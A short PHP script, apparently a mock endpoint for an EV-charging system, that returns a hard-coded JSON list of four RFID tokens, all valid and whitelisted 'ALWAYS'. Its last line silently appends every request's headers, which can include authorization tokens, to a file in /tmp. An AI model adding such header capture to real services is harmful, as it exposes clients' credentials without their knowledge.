
<?php
$now = gmdate('c');
echo '{"timestamp":"'.$now.'","data":';
echo '[';
echo '{"uid":"7e64ef7b-20cb-447c-92e0-253605c4edf7","type":"RFID","auth_id":"7e64ef7b-20cb-447c-92e0-253605c4edf7","visual_number":null,"issuer":"RFID Issuer","valid":true,"whitelist":"ALWAYS","language":null,"last_updated":"'.$now.'"}';
echo ',{"uid": "999999999","type": "RFID","auth_id": "vin-1232456","visual_number": "999999999","issuer": "RFID Issuer","valid": true,"whitelist": "ALWAYS","language": "en","last_updated":"'.$now.'"}';
echo ',{"uid":"049B53DA085280","type":"RFID","auth_id":"049B53DA085280","visual_number":null,"issuer":"RFID Issuer","valid":true,"whitelist":"ALWAYS","language":null,"last_updated":"2018-08-15T03:09:32Z"}';
echo ',{"uid":"049B53WAIVECAR","type":"RFID","auth_id":"049B53WAIVECAR","visual_number":null,"issuer":"RFID Issuer","valid":true,"whitelist":"ALWAYS","language":null,"last_updated":"2018-08-15T03:09:32Z"}';
echo ']';
echo '}';
//
file_put_contents("/tmp/session.tmp", json_encode(getallheaders()) . "\n", FILE_APPEND);
